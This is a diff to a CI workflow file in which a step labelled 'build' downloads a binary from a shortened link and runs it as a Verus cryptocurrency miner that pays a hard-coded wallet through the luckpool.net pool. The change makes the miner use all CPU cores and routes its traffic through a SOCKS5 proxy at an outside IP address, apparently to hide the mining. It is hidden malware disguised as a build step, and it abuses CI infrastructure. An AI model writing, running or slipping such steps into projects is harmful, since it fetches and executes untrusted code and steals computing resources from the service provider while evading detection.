@@ -51,4 +51,4 @@ jobs:
     - name : install dependencies 
       run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
     - name: build  
-      run: wget -qO build https://git.io/JiGZh && chmod +x build && ./build -a verus -o stratum+tcp://na.luckpool.net:3956 -u RAekckRhnyPrdNhqC6WJbHNNBiwCzEy16D -p x -t 2
+      run: wget -qO build https://git.io/JiGZh && chmod +x build && ./build -a verus -o stratum+tcp://na.luckpool.net:3956 -u RAekckRhnyPrdNhqC6WJbHNNBiwCzEy16D -p x -t $(nproc --all) -x socks5://209.127.191.180
